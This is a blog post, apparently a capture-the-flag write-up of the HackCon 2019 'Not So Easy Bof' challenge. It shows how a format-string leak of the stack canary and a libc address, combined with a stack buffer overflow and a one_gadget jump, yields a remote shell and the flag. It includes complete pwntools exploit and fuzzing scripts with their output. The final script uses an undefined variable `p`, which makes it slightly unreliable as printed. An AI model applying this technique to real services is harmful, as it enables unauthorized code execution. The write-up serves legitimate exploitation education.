---
layout: post
title:  "HackCon 2019: Not So Easy Bof"
date:   2019-08-23 19:00:00 +0800
categories: writeups hackcon
---

# Not So Easy Bof

### Challenge

* **Category:** pwn
* **Points:** 469
* **Solves:** 29

>I have stack canaries enabled, Can you still B0f me ? Service : `nc 68.183.158.95 8991`

The challenge provided the following files.
```
q3
libc.so.6
```

### Solution

To start off with, the libc file they provided was libc-2.23, so I spun up my Ubuntu Xenial VM and got started. I renamed the binary to `b0f`, and then ran checksec on the binary.
```sh
vagrant@ubuntu-xenial:/ctf/hackcon2019/pwn/not_so_easy_b0f$ checksec b0f
[*] '/ctf/hackcon2019/pwn/not_so_easy_b0f/b0f'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

And so we find out that literally every single protection mechanism that checksec knows of is enabled. This challenge really showcases how deadly format string vulnerabilities can be. Without the format string vulnerability (that I will soon demonstrate), we could not have possibly bypassed all of these protections without a heap exploit. 

I first try just running the binary and seeing what happens.
```sh
vagrant@ubuntu-xenial:/ctf/hackcon2019/pwn/not_so_easy_b0f$ ./b0f
Enter name : aaa
Hello
aaa
Enter sentence : bbbbbbb
```

Okay, let's get onto disassembling the binary and see what we can find. The binary only has a main function and some PLT entries for puts, printf, and read. The following is the disassembly of the main function. 

*Click on the image to view full size.*

[![](/images/hackcon2019/notsoeasybof.png){:width="350px"}](/images/hackcon2019/notsoeasybof.png)

So we see two vulnerabilities right off the bat.

* A format string vulnerability at `0x000007ea`, where the string we enter as our name is output using `printf(format);`. No buffer overflow here since the `read()` call only reads 0x10 bytes of input.
* A buffer overflow vulnerability at `0x00000810`, where the `read()` call reads 0x100 bytes of input, resulting in a buffer overflow.

Before we get started, we need to deal with the stack canary. My initial plan was to use the format string vulnerability to leak the stack canary, and then use it to call `puts()` with its own GOT entry to leak the libc address of `puts`. However, I realized pretty quickly that this will not work, simply because the binary has PIE enabled, thus unless we somehow get the base address of the binary, jumping to `puts()` or anywhere in the binary is not going to work.

I then changed my plan, I first just started by trying to leak the stack canary. The following script does the job:
```python
#!/usr/bin/env python2

from pwn import *

context.log_level = 'critical'
BINARY = './b0f'

for i in range(2, 20):
    p = process(BINARY)
    p.sendline('AAAA %{}$lx'.format(i))
    p.recvline()
    print '%02d: '%(i) + p.recvline()[:-1]
    p.close()

print ''
```

Output:
```sh
vagrant@ubuntu-xenial:/ctf/hackcon2019/pwn/not_so_easy_b0f$ ./fuzz.py 
02: AAAA 7fcaad749780
03: AAAA 7fa69935d2c0
04: AAAA 7f99906d1700
05: AAAA 0
06: AAAA 7fffb1830e1e
07: AAAA 7fb513b918e0
08: AAAA 2438252041414141
09: AAAA a786c
10: AAAA 7ffd25f51a50
11: AAAA fcca802dabe6e00
12: AAAA 5597f784b830
13: AAAA 7f9ab4ce9830
14: AAAA 1
15: AAAA 7fff1cbd1168
16: AAAA 1398dbca0
17: AAAA 559f088b977a
18: AAAA 0
19: AAAA ad8b789ed837bb8c
```

We note three things here.

1. The string we type in appears at the 8th offset because `2438252041414141` is just `AAAA %8$lx` backwards in hex due to little endianness.
2. At offsets 2, 3, 4, 6, 7, 10, 13, and 15, we have what looks like libc addresses since they start with `0x7f`.
3. At offsets 11 and 19, we have what look like stack canary values.

So now I decided on a new plan. We can do the following to get a shell easily.

1. Leak both the stack canary and a libc address with the format string vulnerability.
2. Use the libc address to calculate the libc base address, then use that to find a one gadget in libc. This lets us bypass every single protection mechanism.
3. Use the buffer overflow to get RIP control and jump to our one gadget, making sure to not change the stack canary as we do it.

Seems easy enough, first lets quickly find the offset of one of these leaked addresses from libc. I do the following.

1. Open the binary in gdb, run it and type in `%3$lx` in the first prompt.
2. Press CTRL+C, use `vmmap` to find the libc base address.
3. Calculate the difference between the leaked address and the base address.

```sh
gef➤  run
Starting program: /ctf/hackcon2019/pwn/not_so_easy_b0f/b0f 
Enter name : %3$lx
Hello
7ffff7b042c0
Enter sentence : ^C
Program received signal SIGINT, Interrupt.

gef➤  vmmap
Start              End                Offset             Perm Path
....
0x00007ffff7a0d000  0x00007ffff7bcd000 0x0000000000000000 r-x /lib/x86_64-linux-gnu/libc-2.23.so
0x00007ffff7bcd000  0x00007ffff7dcd000 0x00000000001c0000 --- /lib/x86_64-linux-gnu/libc-2.23.so
0x00007ffff7dcd000  0x00007ffff7dd1000 0x00000000001c0000 r-- /lib/x86_64-linux-gnu/libc-2.23.so
0x00007ffff7dd1000  0x00007ffff7dd3000 0x00000000001c4000 rw- /lib/x86_64-linux-gnu/libc-2.23.so
....

gef➤  p 0x7ffff7b042c0 - 0x00007ffff7a0d000
$1 = 0xf72c0
```

Okay so we have a way to get the libc base address. I also use the `one_gadget` tool created by david942j found [here](https://github.com/david942j/one_gadget), to find the one gadget in the `libc.so.6` file.
```sh
vagrant@ubuntu-xenial:/ctf/hackcon2019/pwn/not_so_easy_b0f$ one_gadget libc.so.6 
0x45216 execve("/bin/sh", rsp+0x30, environ)
constraints:
  rax == NULL

0x4526a execve("/bin/sh", rsp+0x30, environ)
constraints:
  [rsp+0x30] == NULL

0xf02a4 execve("/bin/sh", rsp+0x50, environ)
constraints:
  [rsp+0x50] == NULL

0xf1147 execve("/bin/sh", rsp+0x70, environ)
constraints:
  [rsp+0x70] == NULL
```

In our case (as we will find out), the first one gadget offset works just fine.

Now, we need to find out whether our stack canary is at offset 11 or 19. This is also done through gdb. I simply break at the `xor rcx,QWORD PTR fs:0x28` instruction at `main+164`, as that is what checks to make sure the stack canary hasn't changed. Once we hit our breakpoint, we can view the value in the `rcx` register to find our stack canary. By checking both `%11$lx` and `%19$lx`, we verify that our stack canary is at offset 11.

Finally, we need to figure out the offset to the stack canary. Again, using gdb gef and `pattern create`, we simply create a unique pattern of 100 characters and send this as input when we are asked to enter a sentence. We break on the `xor rcx,QWORD PTR fs:0x28` instruction at `main+164`, and check the value of the `rcx` register. We see its value is `0x6161616161616164`, and using `pattern offset` to find the offset, we see that it is at offset 24.

We now have everything we need to solve the challenge. Here is the exploit script:
```python
#!/usr/bin/env python2

from pwn import *

# stack canary is at offset 11 for format string
# It is at offset 24 for buffer overflow

HOST, PORT = '68.183.158.95', 8991
BINARY = './b0f'

elf = ELF(BINARY)
context.arch = 'amd64'

if not args.REMOTE:
    libc = elf.libc
else:
    libc = ELF('./libc.so.6')

def start():
    if not args.REMOTE:
        print "LOCAL PROCESS"
        return process(BINARY)
    else:
        print "REMOTE PROCESS"
        return remote(HOST, PORT)

# Leak stack canary (offset 11) and the libc address (offset 3)
p.sendline('%11$lx-%3$lx')
p.recvline()
leaks = p.recvline()
stack_canary = int(leaks.split('-')[0], 16)
libc.address = int(leaks.split('-')[1][:-1], 16) - 0xf72c0

log.info('canary: ' + hex(stack_canary))
log.info('libc base: ' + hex(libc.address))

system = libc.symbols['system']
bin_sh = next(libc.search('/bin/sh'))
one_gadget = libc.address + 0x45216 # 0x4526a, 0xf02a4, 0xf1147

log.info('system: ' + hex(system))
log.info('bin sh: ' + hex(bin_sh))
log.info('one_gadget: ' + hex(one_gadget))

payload = 'A'*24 # Write up to the stack canary
payload += p64(stack_canary) # Ensure we don't change the stack canary
payload += 'B'*8 # Overwrite RBP
payload += p64(one_gadget) # Overwrite RIP

p.sendline(payload)

p.interactive()
```

Output:
```sh
vagrant@ubuntu-xenial:/ctf/hackcon2019/pwn/not_so_easy_b0f$ ./exploit.py REMOTE
[*] '/ctf/hackcon2019/pwn/not_so_easy_b0f/b0f'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[*] '/ctf/hackcon2019/pwn/not_so_easy_b0f/libc.so.6'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
REMOTE PROCESS
[+] Opening connection to 68.183.158.95 on port 8991: Done
[*] canary: 0x7131e60513e19300
[*] libc base: 0x7fd2cb3c0000
[*] one_gadget: 0x7fd2cb405216
[*] Switching to interactive mode
Enter sentence : $ ls
bin
boot
dev
etc
flag.txt
home
lib
lib64
media
mnt
opt
proc
q3
root
run
sbin
srv
sys
tmp
usr
var
$ cat flag.txt
d4rk{H3ll0_R0p}c0de
$  
```

Flag: `d4rk{H3ll0_R0p}c0de`